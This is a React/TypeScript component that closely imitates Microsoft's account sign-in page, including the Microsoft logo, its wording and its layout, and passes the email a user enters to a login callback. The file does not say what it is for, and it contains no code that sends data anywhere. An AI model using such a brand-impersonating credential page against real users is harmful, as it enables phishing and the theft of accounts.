import React, { useState } from 'react';
import './index.css';

interface MicrosoftLoginPageProps {
  onBack?: () => void;
  onLoginSuccess: (credentials: { email: string; password?: string }) => void;
  onLoginError: (error: string) => void;
  showBackButton?: boolean;
}

const MicrosoftLoginPage: React.FC<MicrosoftLoginPageProps> = ({
  onBack,
  onLoginSuccess,
  onLoginError,
  showBackButton
}) => {
  const [email, setEmail] = useState('');
  const [error, setError] = useState('');
  const [showOptions, setShowOptions] = useState(false);

  const handleNext = () => {
    if (!email) {
      setError('Please enter your email, phone, or Skype.');
      return;
    }
    setError('');
    onLoginSuccess({ email });
  };

  return (
    <div
      className="ms-login-root"
      style={{
        minHeight: '100vh',
        background: 'radial-gradient(circle at 70% 20%, #e5e7eb 0, #f3f3f3 100%)',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        position: 'relative'
      }}
    >
      {/* Main Login Box */}
      <div
        className="ms-login-card"
        style={{
          background: '#fff',
          borderRadius: 6,
          minWidth: 440,
          maxWidth: 540,
          boxShadow: '0 2px 8px 0 rgba(0,0,0,0.11)',
          padding: '36px 48px 32px 48px',
          marginBottom: 28,
          fontFamily: "'Segoe UI', Arial, sans-serif"
        }}
      >
        {/* Microsoft SVG logo */}
        <div
          style={{
            width: 115,
            marginBottom: 26,
            marginLeft: 2,
            display: 'flex',
            alignItems: 'center'
          }}
        >
          <svg xmlns="http://www.w3.org/2000/svg" width="115" height="30" viewBox="-50.64 -18 438.88 108">
            <path fill="#737373" d="M140.4 14.4v43.2h-7.5V23.7h-.1l-13.4 33.9h-5l-13.7-33.9h-.1v33.9h-6.9V14.4h10.8l12.4 32h.2l13.1-32zm6.2 3.3c0-1.2.4-2.2 1.3-3 .9-.8 1.9-1.2 3.1-1.2 1.3 0 2.4.4 3.2 1.2.8.8 1.3 1.8 1.3 3s-.4 2.2-1.3 3c-.9.8-1.9 1.2-3.2 1.2-1.3 0-2.3-.4-3.1-1.2-.8-.9-1.3-1.9-1.3-3zm8.1 8.9v31h-7.3v-31zm22.1 25.7c1.1 0 2.3-.2 3.6-.8 1.3-.5 2.5-1.2 3.6-2v6.8c-1.2.7-2.5 1.2-4 1.5-1.5.3-3.1.5-4.9.5-4.6 0-8.3-1.4-11.1-4.3-2.9-2.9-4.3-6.6-4.3-11 0-5 1.5-9.1 4.4-12.3 2.9-3.2 7-4.8 12.4-4.8 1.4 0 2.8.2 4.1.5 1.4.3 2.5.8 3.3 1.2v7c-1.1-.8-2.3-1.5-3.4-1.9-1.2-.4-2.4-.7-3.6-.7-2.9 0-5.2.9-7 2.8-1.8 1.9-2.6 4.4-2.6 7.6 0 3.1.9 5.6 2.6 7.3 1.7 1.7 4 2.6 6.9 2.6zm27.9-26.2c.6 0 1.1 0 1.6.1s.9.2 1.2.3v7.4c-.4-.3-.9-.6-1.7-.8-.8-.2-1.6-.4-2.7-.4-1.8 0-3.3.8-4.5 2.3-1.2 1.5-1.9 3.8-1.9 7v15.6h-7.3v-31h7.3v4.9h.1c.7-1.7 1.7-3 3-4 1.4-.9 3-1.4 4.9-1.4zm3.2 16.5c0-5.1 1.5-9.2 4.3-12.2 2.9-3 6.9-4.5 12-4.5 4.8 0 8.6 1.4 11.3 4.3 2.7 2.9 4.1 6.8 4.1 11.7 0 5-1.5 9-4.3 12-2.9 3-6.8 4.5-11.8 4.5-4.8 0-8.6-1.4-11.4-4.2-2.8-2.9-4.2-6.8-4.2-11.6zm7.6-.3c0 3.2.7 5.7 2.2 7.4 1.5 1.7 3.6 2.6 6.3 2.6 2.6 0 4.7-.8 6.1-2.6 1.4-1.7 2.1-4.2 2.1-7.6 0-3.3-.7-5.8-2.1-7.6-1.4-1.7-3.5-2.6-6-2.6-2.7 0-4.7.9-6.2 2.7-1.7 1.9-2.4 4.4-2.4 7.7zm35-7.5c0 1 .3 1.9 1 2.5.7.6 2.1 1.3 4.4 2.2 2.9 1.2 5 2.5 6.1 3.9 1.2 1.5 1.8 3.2 1.8 5.3 0 2.9-1.1 5.2-3.4 7-2.2 1.8-5.3 2.6-9.1 2.6-1.3 0-2.7-.2-4.3-.5-1.6-.3-2.9-.7-4-1.2v-7.2c1.3.9 2.8 1.7 4.3 2.2 1.5.5 2.9.8 4.2.8 1.6 0 2.9-.2 3.6-.7.8-.5 1.2-1.2 1.2-2.3 0-1-.4-1.8-1.2-2.6-.8-.7-2.4-1.5-4.6-2.4-2.7-1.1-4.6-2.4-5.7-3.8-1.1-1.4-1.7-3.2-1.7-5.4 0-2.8 1.1-5.1 3.3-6.9 2.2-1.8 5.1-2.7 8.6-2.7 1.1 0 2.3.1 3.6.4 1.3.3 2.5.6 3.4.9V34c-1-.6-2.1-1.2-3.4-1.7-1.3-.5-2.6-.7-3.8-.7-1.4 0-2.5.3-3.2.8-.7.7-1.1 1.4-1.1 2.4zm16.4 7.8c0-5.1 1.5-9.2 4.3-12.2 2.9-3 6.9-4.5 12-4.5 4.8 0 8.6 1.4 11.3 4.3 2.7 2.9 4.1 6.8 4.1 11.7 0 5-1.5 9-4.3 12-2.9 3-6.8 4.5-11.8 4.5-4.8 0-8.6-1.4-11.4-4.2-2.7-2.9-4.2-6.8-4.2-11.6zm7.6-.3c0 3.2.7 5.7 2.2 7.4 1.5 1.7 3.6 2.6 6.3 2.6 2.6 0 4.7-.8 6.1-2.6 1.4-1.7 2.1-4.2 2.1-7.6 0-3.3-.7-5.8-2.1-7.6-1.4-1.7-3.5-2.6-6-2.6-2.7 0-4.7.9-6.2 2.7-1.6 1.9-2.4 4.4-2.4 7.7zm48.4-9.7H312v25h-7.4v-25h-5.2v-6h5.2v-4.3c0-3.2 1.1-5.9 3.2-8 2.1-2.1 4.8-3.1 8.1-3.1.9 0 1.7.1 2.4.1s1.3.2 1.8.4V18c-.2-.1-.7-.3-1.3-.5-.6-.2-1.3-.3-2.1-.3-1.5 0-2.7.5-3.5 1.4-.8.9-1.2 2.4-1.2 4.2v3.7h10.9v-7l7.3-2.2v9.2h7.4v6h-7.4V47c0 1.9.4 3.2 1 4 .7.8 1.8 1.2 3.3 1.2.4 0 .9-.1 1.5-.3.6-.2 1.1-.4 1.5-.7v6c-.5.3-1.2.5-2.3.7-1.1.2-2.1.3-3.2.3-3.1 0-5.4-.8-6.9-2.4-1.5-1.6-2.3-4.1-2.3-7.4z"/>
            <path fill="#f25022" d="M0 0h34.2v34.2H0z"/>
            <path fill="#7fba00" d="M37.8 0H72v34.2H37.8z"/>
            <path fill="#00a4ef" d="M0 37.8h34.2V72H0z"/>
            <path fill="#ffb900" d="M37.8 37.8H72V72H37.8z"/>
          </svg>
        </div>
        <h2 style={{
          fontWeight: 400,
          fontSize: 28,
          margin: 0,
          color: '#1b1b1b'
        }}>Sign in</h2>
        <form
          style={{ marginTop: 20 }}
          onSubmit={e => { e.preventDefault(); handleNext(); }}
        >
          <input
            type="text"
            placeholder="Email, phone, or Skype"
            value={email}
            onChange={e => setEmail(e.target.value)}
            style={{
              width: '100%',
              fontSize: 17,
              padding: '9px 10px',
              border: 'none',
              borderBottom: '1.5px solid #8a8886',
              outline: 'none',
              background: 'transparent',
              marginBottom: 20
            }}
            autoFocus
          />
          {error && (
            <div style={{ color: 'red', fontSize: 14, marginBottom: 12 }}>{error}</div>
          )}
          <div style={{ fontSize: 15, color: '#222', marginBottom: 6 }}>
            No account?{' '}
            <a
              href="#"
              style={{
                color: '#106ebe',
                textDecoration: 'none',
                fontWeight: 400
              }}
              tabIndex={0}
            >
              Create one!
            </a>
          </div>
          <div style={{ fontSize: 15, marginBottom: 30 }}>
            <a
              href="#"
              style={{
                color: '#106ebe',
                textDecoration: 'none',
                fontWeight: 400
              }}
              tabIndex={0}
            >
              Can't access your account?
            </a>
          </div>
          <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
            <button
              type="submit"
              style={{
                background: '#106ebe',
                color: '#fff',
                border: 'none',
                borderRadius: 2,
                fontWeight: 400,
                fontSize: 17,
                padding: '8px 32px',
                boxShadow: '0 1px 2px 0 rgba(0,0,0,0.11)',
                cursor: 'pointer',
                transition: 'background 0.2s'
              }}
            >
              Next
            </button>
          </div>
        </form>
      </div>
      {/* Sign-in options box separate and below main card */}
      <div
        className="ms-signin-options"
        style={{
          width: 540,
          maxWidth: '90vw',
          background: '#f7f7f7',
          borderRadius: 6,
          boxShadow: '0 1px 3px 0 rgba(0,0,0,0.09)',
          padding: '10px 18px',
          display: 'flex',
          alignItems: 'center',
          cursor: 'pointer',
          fontFamily: "'Segoe UI', Arial, sans-serif",
          marginTop: 10
        }}
        tabIndex={0}
        onClick={() => setShowOptions(true)}
      >
        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" style={{ marginRight: 16 }}>
          <circle cx="12" cy="12" r="10" stroke="#767676" strokeWidth="1.5" />
          <rect x="10.5" y="7" width="3" height="7" rx="1.5" fill="#767676" />
          <circle cx="12" cy="17" r="1" fill="#767676" />
        </svg>
        <span style={{ fontSize: 17, color: '#222', fontWeight: 400 }}>
          Sign-in options
        </span>
      </div>
      {/* Optional: show sign-in options modal */}
      {showOptions && (
        <div
          tabIndex={-1}
          style={{
            position: 'fixed',
            left: 0, top: 0, right: 0, bottom: 0,
            background: 'rgba(0,0,0,0.17)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            zIndex: 10
          }}
          onClick={() => setShowOptions(false)}
        >
          <div style={{
            background: '#fff',
            borderRadius: 8,
            minWidth: 300,
            padding: 32,
            position: 'relative'
          }}>
            <button
              style={{
                position: 'absolute', right: 16, top: 10, border: 'none', background: 'none',
                fontSize: 22, cursor: 'pointer', color: '#444'
              }}
              aria-label="Close"
              onClick={() => setShowOptions(false)}
            >&times;</button>
            <h3 style={{margin:0, fontWeight:500, fontSize:20, color:'#1b1b1b'}}>Sign-in options</h3>
            <p style={{margin: '16px 0 0 0', color:'#555'}}>Use a different sign-in method.</p>
          </div>
        </div>
      )}
      {/* Terms of use Privacy & cookies ... */}
      <div
        style={{
          position: 'fixed',
          right: 38,
          bottom: 18,
          zIndex: 12,
          display: 'flex',
          gap: 18,
          fontFamily: "'Segoe UI', Arial, sans-serif"
        }}
      >
        <a
          href="#"
          style={{
            fontSize: 14,
            color: '#106ebe',
            textDecoration: 'none',
            fontWeight: 400,
            marginRight: 2
          }}
          tabIndex={0}
        >
          Terms of use
        </a>
        <a
          href="#"
          style={{
            fontSize: 14,
            color: '#106ebe',
            textDecoration: 'none',
            fontWeight: 400,
            marginRight: 2
          }}
          tabIndex={0}
        >
          Privacy & cookies
        </a>
        <a
          href="#"
          style={{
            fontSize: 17,
            color: '#106ebe',
            fontWeight: 400,
            textDecoration: 'none',
            marginLeft: 6,
            cursor: 'pointer'
          }}
          tabIndex={0}
        >
          ...
        </a>
      </div>
    </div>
  );
};

export default MicrosoftLoginPage;